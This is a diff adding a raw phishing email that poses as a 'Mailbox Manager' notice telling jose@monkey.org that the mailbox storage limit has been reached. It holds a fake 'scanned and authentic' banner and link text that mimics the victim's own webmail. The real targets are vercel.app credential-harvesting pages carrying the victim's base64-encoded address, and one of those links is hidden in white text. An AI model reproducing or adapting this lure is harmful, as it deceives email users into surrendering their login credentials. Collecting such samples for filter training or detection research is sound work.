@@ -1,0 +1,205 @@
+Return-Path: mailer@bravixwp.com
+Delivered-To: jose@monkey.org
+X-FDA: 83539993236.25.3A405A2
+Received: from mail.bravixwp.com (mail.bravixwp.com [192.236.154.125])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 833D9A0003
+	for <jose@monkey.org>; Tue, 10 Jun 2025 16:16:16 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;
+	dkim=pass header.d=bravixwp.com header.s=mail header.b=AafSRO8x;
+	dmarc=pass (policy=quarantine) header.from=bravixwp.com;
+	spf=pass (imf07.b.hostedemail.com: domain of mailer@bravixwp.com designates
+ 192.236.154.125 as permitted sender) smtp.mailfrom=mailer@bravixwp.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1749572177; a=rsa-sha256;
+	cv=none;
+	b=l5UF0h+ZQte5DJiu67D+mWeqLf+JwVp4jJXsnCdMtvWu0kNA1w7971KGN3hl6p2tbTPGVH
+	vYTkBPxmtH+HerfzdkuDKlif698BkytfoxJHs7/xS/y6ojdKFS862f5zNisuC0/8tfMx+o
+	Dft9QdTiJ6O8hKl4RuKW1UrlblVRXdI=
+ARC-Authentication-Results: i=1;
+	imf07.b.hostedemail.com;
+	dkim=pass header.d=bravixwp.com header.s=mail header.b=AafSRO8x;
+	dmarc=pass (policy=quarantine) header.from=bravixwp.com;
+	spf=pass (imf07.b.hostedemail.com: domain of mailer@bravixwp.com designates
+ 192.236.154.125 as permitted sender) smtp.mailfrom=mailer@bravixwp.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1749572177;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-unsubscribe:dkim-signature;
+	bh=Mm3UQ7J5l1SHS3mSPCtOLD0y+OorHrRzHNNIMtPDw5w=;
+	b=Fz8Rnr2c8KyvWL+GH4ALXBg4ayqEM0B919EJGAda/P9VstT2shmGQcaxNOM5tc0pnCXA4D
+	4kdyN1n9Gq4HPiywN4Kg/lTpyPiZRrOVIB6m3MjVtR2rAWERQr2unq75xLN1qg5PMO/xPc
+	w7R1ViRqAmzLr7mJQxqmnrQyhIViN5E=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=bravixwp.com; s=mail;
+	t=1749571078; bh=O28CKKH8l1wEdjcK9g5/L7ZbHgrtwOXzQ89cQWqin5g=;
+	h=From:To:Subject:Date:List-Unsubscribe:From;
+	b=AafSRO8xozvHeKrsh7LuxWTZashJpy9rYkVbAk8TZKoiNgDWjX+bGp0FaKOnpzbrC
+	 +kCXzdoaaCLEfeHpR/B+DH36cJbNmc6Bkqqa24C67l3UYInuZt2E9GGjcSuS+3a9XG
+	 WBr0FcxF9jBQdn3YQpm0xAAG4uWvkIclHJLr8ZOQ0AlT5mOnA2ha2QBqsUAblDQFMu
+	 7G88Q/Rm02wG82IhwhUsvorGUxEW26yoma25Ng+cD9i2qpCR4yshXDi/ak+wb1zBxW
+	 ZIReDXnk4lrG9s9uLFesMEMxw5kaxmRJWPpI7vO+k2vrOET9VxEs/JItRp3QIYxJij
+	 x4R2H/sOpiSiA==
+Received: from authenticated-user (mail.bravixwp.com [192.236.154.125])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest
+ SHA256)
+	(No client certificate requested)
+	by mail.bravixwp.com (Postfix) with ESMTPSA id 9379642112
+	for <jose@monkey.org>; Tue, 10 Jun 2025 15:57:58 +0000 (UTC)
+From: Mailbox Manager <mailer@bravixwp.com>
+To: jose@monkey.org
+Subject: Mailbox quota exceeded for jose@monkey.org ID#:343847
+Date: 10 Jun 2025 17:57:58 +0200
+Message-ID: <20250610175757.0BB47A0CE080D110@bravixwp.com>
+MIME-Version: 1.0
+List-Unsubscribe: <mailto:mailer@bravixwp.com>
+Organization: Foobar Inc.
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_1BAFBC0C.03B04EE9"
+X-Stat-Signature: 33g6mk7gqfkiaet1k4zkaoz35e4m9qj8
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 833D9A0003
+X-Rspamd-Server: rspam08
+X-Spam-Status: No, score=-0.81
+X-HE-Tag: 1749572176-600958
+X-HE-Meta: 
+ U2FsdGVkX1/MEXR1ArYMIWEnNb/MqWtkUY0OxzMdbKLi14lCNnm/TMngxTFoeY7fUnqUIurqGEO4QeM20TyRnoE3My7D8A55rOwv1aCgDsp+yJrIwWS+495W4R3/33u1HMja/cLFfDVg3F1Wy9+2ecY0t0H39f2Mre8Wo8XMxh2EKpquQiqZUzTt/ib7AcFNRCJK60FlVCPR0BG18HJm6PFJVSHQyV9ywcPx3XIvn4AgIjm60ttjsAYQ0vJ1TDQ66Xn/MXkJugCyf22R4AsKzpaarc1Qw8IYPRz9hidg3PelcYKdFteA4N/E+cVSXbiKhW9AtmI1p+sxpOcBhOwwVA/WdMjcqvf1uuDVmAFDtzFH6255f6y1CAPX4VO/X7ir2Lm+LrHzjbPZzkFRx8NUrSVj7MWm47WIJBI9isM0PF93ieTovccYxTiZyFt9zKqKZDsJImpfpC8Otvj2LLu8dk4cXQqSxeJanUziTSupj/Nq9T2AMGcHxpVbWnXPX+Qa2yoOKOnXafaCAvaJ8bcIQL7iVRHxaD7rz9tuEeLhIpL+47gJ7YW+UDrEfG/rQK90Izh3uwxk2CFrE+I+lmYW50fZwRJueUeSBp7rEEKvcltbTTBuYLkGEF/Wg/WiHxbOLC2fnfP3cKA89TMwbuTZsZXcqQO4+MSsmyzoEoSrIseSpOzFIWLLllNdoglZSJ1GYUwcGu2y41oF+snIrQNoEDkP9VH/mbVC4RPpw3DMcNeCJUJc7upwB0wYVrcvfnrUZFq4yyiHGIJRDH+kcFJ9B4jgVp/pfwYp/H/iHW4l45YHLuwBc7EUd2c6jlmQaj5dXzKwW1S6xIaKQUtcJ6aWYpJiLPv34Au0LxFHGtx1D9q25o+Om68zJ2UI5E5ynfb6ZfaoN2zn2nH4dJwcOtGyjVwp933zCainUGIyWRQ9krg3HPLkNf07wEjQlLeDDzBb2P+TZ/57c2njkJortC01hmTXL8r
+ bpxhBi9/naIikOHNhK/jRYnJ0tNDADvH7GAE479oG8cSNBzQWu8kZGdCd09tgK9owjTFDuTiR9mtu9qzJsxT0c9dyRu8xHKvJCBtXEO26MuF4lZ1JI9z6dQSY+2kYuYE1smoJ8kMfjhiS3CwArWicjCNxZX+vkK62e+LuMXNw9Aqrv7CXBOT12Phqfgyh30f6D9cf8NDxD1pm8yGfBtG50E1NM3DciJpmj9NwASf7Ng4Mgs2dHMd0LyUuXa9B/Fe9ilbgezwhEHORdWYXk+eRm5UcNk5k2NGEIQDvn3W0FANFaWDZze0hT8r7DZFZgcGcGBqtQYSU+b78FlnKXDKiU2+PWW5BWhRvAo1uN+kddEnb/gy2y71xnWCtYzcdCSf3nH/YlBmdmh2iLBTx4qeZB8/MyHb2OuArbMXXejETdujpYwd3uaBub4c8gzXTYhfUsmsxDInjvySBJS32WkLIpptQP0Gm7awd5c4vgDLJfmEUek6zctthOxB3xA6fPYsDJSwvcHCjJSSnAK5todS6yJrAFrejd9O20+aJaujSNDbGAqw=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 251
+
+------=_NextPart_000_0012_1BAFBC0C.03B04EE9
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+=C2=A0This email has been scanned by our=C2=A0monkey.org mail server=C2=A0a=
+nd is=20
+authentic.
+
+
+Action Required: Email Storage Limit Reached
+=C2=A0jose@monkey.org,
+
+Our system has detected=C2=A0
+that your email account has reached its storage limit on 10/06/
+2025 5:57:57 p.m..=C2=A0As a result, some incoming and outgoing emails=20
+may be restricted=C2=A0until additional space is freed or your storage=20
+is upgraded.
+
+To ensure uninterrupted service, please
+sign in=C2=A0and manage your storage settings by visiting:
+
+
+https;//webmail.monkey.org/increase_storage
+Best Regards,
+monkey.org=C2=A0Email Management Team
+
+
+=C2=A9 2025 Inc. All Rights Reserved
+
+Unsubscribe
+------=_NextPart_000_0012_1BAFBC0C.03B04EE9
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/htm=
+l4/strict.dtd">
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3DISO-8859-=
+1">
+  <title></title>
+</head>
+<body>
+<table width=3D"100%" style=3D"padding: 10px 0px; text-align: left; color: =
+rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family:=
+ Calibri; font-size: 17.33px; font-style: normal; font-weight: 400; word-sp=
+acing: 0px; white-space: normal; border-collapse: collapse; box-sizing: bor=
+der-box; orphans: 2; widows: 2; background-color: rgb(233, 247, 239); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;" cellspacin=
+g=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr styl=
+e=3D"box-sizing: border-box;"><td align=3D"center" style=3D"color: rgb(46, =
+125, 50); font-family: Arial, sans-serif; font-size: 14px; box-sizing: bord=
+er-box;"><img width=3D"24" height=3D"24" style=3D"margin-right: 8px; vertic=
+al-align: middle; box-sizing: border-box;" alt=3D"Scanned and Secure" src=
+=3D"https://img.icons8.com/ios-filled/24/2e7d32/secured-letter.png"><span>
+&nbsp;</span>This email has been scanned by our&nbsp;monkey.org mail server=
+<span>&nbsp;</span>and is authentic.</td></tr></tbody></table>
+<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Calibri; font-size:=
+ 17.33px; font-style: normal; font-weight: 400; margin-top: 0px; margin-bot=
+tom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box; =
+orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><br style=
+=3D"box-sizing: border-box;"></p>
+<table width=3D"100%" style=3D"background: rgb(255, 255, 255); margin: auto=
+; padding: 20px; border-radius: 8px; text-align: left; color: rgb(44, 54, 5=
+8); text-transform: none; letter-spacing: normal; font-family: Calibri; fon=
+t-size: 17.33px; font-style: normal; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; border-collapse: collapse; max-width: 600px; box-sizing=
+: border-box; orphans: 2; widows: 2; box-shadow: 0px 0px 10px rgba(0,0,0,0.=
+1); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: b=
+order-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"text-align: =
+center; box-sizing: border-box;"><h2 style=3D"color: rgb(51, 51, 51); line-=
+height: 1.2; font-size: 1.5em; font-weight: 700; margin-top: 0px; margin-bo=
+ttom: 0.5rem; box-sizing: border-box;">
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"http://link.com/" target=
+=3D"_blank" rel=3D"noreferrer">Action Required: Email Storage Limit Reached=
+</a></h2></td></tr><tr style=3D"box-sizing: border-box;"><td style=3D"paddi=
+ng: 20px 0px; color: rgb(85, 85, 85); font-size: 16px; box-sizing: border-b=
+ox;">&nbsp;jose@monkey.org,<br style=3D"box-sizing: border-box;"><br style=
+=3D"box-sizing: border-box;">Our system has detected<span>&nbsp;</span>
+that your email account has reached its storage limit on 10/06/2025 5:57:57=
+ p.m..<span>&nbsp;</span>As a result, some incoming and outgoing emails may=
+ be restricted<span>&nbsp;</span>until additional space is freed or your st=
+orage is upgraded.<br style=3D"box-sizing: border-box;"><br style=3D"box-si=
+zing: border-box;">To ensure uninterrupted service, please
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"https://webmail-authncte.v=
+ercel.app/admin/access/2096/auth47415517/cpses/null/rpckwzttwx#am9zZUBtb25r=
+ZXkub3Jn	" target=3D"_blank" rel=3D"noreferrer">sign in</a><span>&nbsp;</sp=
+an>and manage your storage settings by visiting:</td></tr><tr style=3D"box-=
+sizing: border-box;">
+<td style=3D"padding: 20px 0px; text-align: center; box-sizing: border-box;=
+">
+<h3 style=3D"line-height: 1.2; font-size: 1.25em; font-weight: 700; margin-=
+top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;"><a style=3D"color=
+: rgb(0, 123, 255); font-weight: bold; text-decoration: none; box-sizing: b=
+order-box; background-color: transparent;" href=3D"https://webmail-authncte=
+=2Evercel.app/admin/access/2096/auth44125145/cpses/null/ggctjuyqox#am9zZUBt=
+b25rZXkub3Jn	" target=3D"_blank" rel=3D"noreferrer">
+https;//webmail.monkey.org/increase_storage</a>
+</h3></td></tr><tr style=3D"box-sizing: border-box;"><td style=3D"text-alig=
+n: center; color: rgb(153, 153, 153); padding-top: 20px; font-size: 12px; b=
+ox-sizing: border-box;"><p style=3D"margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;">Best Regards,<br style=3D"box-sizing: border-box;">=
+monkey.org&nbsp;Email Management Team</p><p style=3D"margin-top: 0px; margi=
+n-bottom: 1rem; box-sizing: border-box;">
+<img width=3D"16" height=3D"16" style=3D"border-color: rgb(0, 0, 0); vertic=
+al-align: middle; box-sizing: border-box;" alt=3D"bluestarenergygroup.com" =
+src=3D"https://www.google.com/s2/favicons?domain=3Dbluestarenergygroup.com"=
+><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;=
+">&copy; 2025 Inc. All Rights Reserved</p></td></tr><tr style=3D"box-sizing=
+: border-box;"><td style=3D"padding: 0px; height: 0px; color: rgb(255, 255,=
+ 255); line-height: 0; font-size: 1px; box-sizing: border-box;">
+<a style=3D"color: rgb(255, 255, 255); text-decoration: none; box-sizing: b=
+order-box; background-color: transparent;" href=3D"https://webmail-authncte=
+=2Evercel.app/admin/access/2096/auth32386404/cpses/null/saihluknyo#am9zZUBt=
+b25rZXkub3Jn	" target=3D"_blank" rel=3D"noreferrer">Unsubscribe</a></td></t=
+r></tbody></table></body></html>
+------=_NextPart_000_0012_1BAFBC0C.03B04EE9--
+
